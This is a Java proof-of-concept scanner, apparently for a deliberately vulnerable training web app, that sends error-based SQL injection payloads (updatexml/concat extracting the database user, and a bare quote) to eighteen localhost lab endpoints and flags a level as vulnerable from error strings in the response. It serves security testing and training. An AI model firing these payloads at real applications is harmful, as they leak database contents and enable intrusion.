package cn.bestsec.vulweb.poc;

import lombok.extern.slf4j.Slf4j;
import okhttp3.*;

import java.io.IOException;
import java.util.ArrayList;


@Slf4j
public class SqliPoc {
    public static void main(String[] args) throws IOException {
        String baseUrl = "http://localhost:8080/sqli/level%d?p=";
        for(int i = 1;i<=18;i++){
            String targetUrl = String.format(baseUrl, i);
            System.out.println(isVul(targetUrl));
        }
    }


    public static boolean isVul(String url){
        ArrayList<String> payloadList = new ArrayList<>();
        payloadList.add("' and updatexml(1,concat(0x7e,(select user())),1)%23");
        payloadList.add("'),(updatexml(1,concat(0x7e,(select user())),1),1)%23");
        payloadList.add("'),(updatexml(1,concat(0x7e,(select user())),1))%23");
        payloadList.add("'");
        OkHttpClient okHttpClient = new OkHttpClient();
        boolean isVul = false;
        isVul = payloadList.stream().anyMatch(payload -> {
            String target = url + payload;
            Request request = new Request.Builder().url(target).get().build();
            Call call = okHttpClient.newCall(request);
            try (Response response = call.execute()) {
                if(response.body() != null){
                    String body = response.body().string();
                    if(body.contains("root@") || body.contains("XPATH syntax error") || body.contains("hibernate.QueryException")){
                        return true;
                    }
                }
            }catch (Exception e){
                log.info("网络连接出错");
            }
            return false;
        });
        if(isVul){
            log.info(url + " 接口存在sql注入漏洞！");
        }else{
            log.info(url + " 接口无漏洞！");
        }
        return isVul;
    }
}
